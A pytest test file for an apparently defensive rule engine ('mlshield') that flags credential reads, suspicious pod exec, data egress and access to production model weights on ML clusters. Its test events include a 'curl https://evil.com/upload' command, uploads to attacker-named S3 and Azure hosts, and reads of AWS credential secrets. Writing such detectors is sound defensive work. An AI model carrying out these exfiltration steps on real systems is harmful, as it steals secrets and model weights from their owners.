# tests/test_detectors.py
"""Tests for the Layer 1 static rule engine."""
import sys
import pytest
from datetime import datetime

sys.path.insert(0, "src")

from mlshield.ingestion.event_bus import TrajectoryEvent, EventSource
from mlshield.specs.spec_validator import SpecValidator
from mlshield.detectors.layer1_rules import RuleEngine


@pytest.fixture
def rule_engine():
    validator = SpecValidator(spec_path="configs/default_specs.yaml")
    return RuleEngine(validator)


def make_event(**kwargs) -> TrajectoryEvent:
    defaults = {
        "event_id": "test",
        "timestamp": datetime(2024, 1, 1),
        "source": EventSource.K8S_AUDIT,
        "job_id": "test-job",
        "user": "admin",
        "action": "k8s_get",
        "resource": "pods/test",
        "details": {},
    }
    defaults.update(kwargs)
    return TrajectoryEvent(**defaults)


class TestRuleEngineBasic:
    """Test basic rule engine behavior."""

    def test_benign_event_clears(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="pods/health",
        )
        result = rule_engine.check(event)
        assert result.is_violation is False

    def test_normal_gpu_snapshot_clears(self, rule_engine):
        event = make_event(
            source=EventSource.DCGM_GPU,
            action="gpu_metrics_snapshot",
            resource="gpu/0",
            details={"DCGM_FI_DEV_GPU_UTIL": 85.0, "z_score": 1.0},
        )
        result = rule_engine.check(event)
        assert result.is_violation is False


class TestCredentialAccess:
    """Test credential access detection."""

    def test_aws_credential_access(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="secrets/aws-credentials",
            details={"namespace": "ml-training"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.severity == "critical"
        assert "credential" in result.violation_type

    def test_generic_secret_access(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="secrets/my-api-key",
            user="hacker",
        )
        result = rule_engine.check(event)
        assert result.is_violation is True

    def test_system_secret_access_allowed(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="secrets/service-account-token",
            user="system:serviceaccount:kube-system:default",
        )
        result = rule_engine.check(event)
        # System accounts should not trigger the user-level secret check
        assert result.is_violation is False


class TestSuspiciousExec:
    """Test suspicious command execution detection."""

    def test_onnx_conversion(self, rule_engine):
        event = make_event(
            action="k8s_exec",
            resource="pods/training-job",
            details={"command": "python convert_to_onnx.py"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.violation_type == "suspicious_exec"

    def test_curl_in_pod(self, rule_engine):
        event = make_event(
            action="k8s_exec",
            resource="pods/training-job",
            details={"command": "curl https://evil.com/upload"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True

    def test_external_ip_exec(self, rule_engine):
        event = make_event(
            action="k8s_exec",
            resource="pods/ray-head",
            details={"source_ip": "203.0.113.99", "command": "ls"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.severity == "critical"
        assert result.violation_type == "external_exec"

    def test_internal_ip_exec_benign_command(self, rule_engine):
        event = make_event(
            action="k8s_exec",
            resource="pods/training-job",
            details={"source_ip": "10.0.0.5", "command": "nvidia-smi"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is False


class TestEgressRules:
    """Test network egress detection."""

    def test_s3_egress(self, rule_engine):
        event = make_event(
            action="network_egress",
            resource="pods/training-job",
            details={"destination": "attacker-bucket.s3.amazonaws.com"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.severity == "critical"

    def test_azure_blob_egress(self, rule_engine):
        event = make_event(
            action="network_egress",
            resource="pods/training-job",
            details={"destination": "evil.blob.core.windows.net"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True

    def test_large_transfer(self, rule_engine):
        event = make_event(
            action="network_egress",
            resource="pods/training-job",
            details={
                "destination": "some-internal-host.local",
                "bytes_sent": 5_000_000_000,
            },
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.violation_type == "large_egress"

    def test_small_internal_transfer_passes(self, rule_engine):
        event = make_event(
            action="network_egress",
            resource="pods/training-job",
            details={
                "destination": "metrics.internal.cluster",
                "bytes_sent": 1000,
            },
        )
        result = rule_engine.check(event)
        assert result.is_violation is False


class TestUnauthorizedResourceAccess:
    """Test unauthorized resource access detection."""

    def test_production_model_access(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="persistentvolumeclaims/frontier-model-v3.safetensors",
            details={"path": "/models/production/frontier-v3.safetensors"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True
        assert result.severity == "critical"

    def test_production_models_list(self, rule_engine):
        event = make_event(
            action="k8s_list",
            resource="persistentvolumeclaims/models-production",
            details={"is_weight_access": True},
        )
        result = rule_engine.check(event)
        assert result.is_violation is True

    def test_training_data_access_passes(self, rule_engine):
        event = make_event(
            action="k8s_get",
            resource="pods/data-loader",
            details={"path": "/data/training/batch_1.parquet"},
        )
        result = rule_engine.check(event)
        assert result.is_violation is False
